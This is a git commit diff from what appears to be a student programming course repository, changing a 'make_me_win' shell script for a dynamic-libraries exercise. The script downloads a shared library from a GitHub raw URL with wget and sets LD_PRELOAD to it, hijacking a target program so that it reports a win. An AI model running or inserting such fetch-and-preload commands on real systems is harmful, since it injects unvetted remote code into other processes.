7c405fdec0e9c7e9be7387f75cf32c998010f0f1
Naphtal USABYUWERA <usanaphtal112@gmail.com>
2023-12-11 09:39:39 -0800

    Added jackport hack tasks

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -p .. https://raw.githubusercontent.com/usanaphtal112/alx-low_level_programming/master/0x18-dynamic_libraries/libinjection_file.so
-export LD_PRELOAD="$PWD/../libinjection_file.so"
+wget -P .. https://raw.githubusercontent.com/usanaphtal112/alx-low_level_programming/master/0x18-dynamic_libraries/libgiga.so
+export LD_PRELOAD="$PWD/../libgiga.so"
